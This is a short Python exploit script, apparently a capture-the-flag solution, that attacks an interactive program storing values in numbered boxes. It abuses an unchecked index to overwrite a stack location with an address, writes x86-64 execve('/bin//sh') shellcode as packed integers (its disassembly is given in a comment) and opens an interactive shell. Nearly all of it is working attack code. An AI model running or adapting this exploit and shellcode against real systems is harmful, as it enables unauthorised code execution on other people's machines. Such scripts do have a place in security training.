import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]
    

"""
Disassembly:
0:  31 f6                   xor    esi,esi
2:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
9:  2f 73 68
c:  56                      push   rsi
d:  53                      push   rbx
e:  54                      push   rsp
f:  5f                      pop    rdi
10: 6a 3b                   push   0x3b
12: 58                      pop    rax
13: 31 d2                   xor    edx,edx
15: 0f 05                   syscall
"""
payload = ["10416984888683040912", "7955998173871797809", "6869206962231521071", "1424770328968042"]

p = interact.Process()
p.readuntil('Enter the box # to store in (0-5 or -1 to stop):')
p.sendline('9')
p.readuntil('Enter value to store in the box:')
p.sendline('140737488350592')

for i in range(len(payload)): 
    print(i)
    p.readuntil('Enter the box # to store in (0-5 or -1 to stop):') 
    p.sendline(f'{i}')
    p.readuntil('Enter value to store in the box:')
    print(len(payload))
    p.sendline(payload[i]) # Nop


p.readuntil('Enter the box # to store in (0-5 or -1 to stop):')
p.sendline('-1')

p.interactive()
